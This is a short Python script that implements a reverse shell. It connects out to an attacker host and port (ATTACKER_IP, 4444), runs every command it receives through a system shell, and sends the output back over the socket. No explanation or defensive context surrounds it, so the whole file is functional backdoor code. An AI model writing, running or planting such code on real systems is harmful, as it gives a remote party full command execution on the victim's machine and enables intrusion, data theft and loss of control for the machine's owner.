import socket
import subprocess
import os
import tempfile

ATTACKER_IP = '0.0.0.0'
ATTACKER_PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ATTACKER_IP, ATTACKER_PORT))

while True:
    command = s.recv(1024).decode()
    if command.lower() == "exit":
        break

    # Create a temporary file to redirect stdout and stderr
    with tempfile.NamedTemporaryFile(delete=False) as temp:
        output = subprocess.Popen(command, shell=True, stdout=temp, stderr=temp, text=True)
        output.communicate()

        # Read the content of the temporary file and send it back
        with open(temp.name, 'r') as result_file:
            result = result_file.read()
            s.sendall(result.encode())

        # Delete the temporary file
        os.remove(temp.name)

s.close()
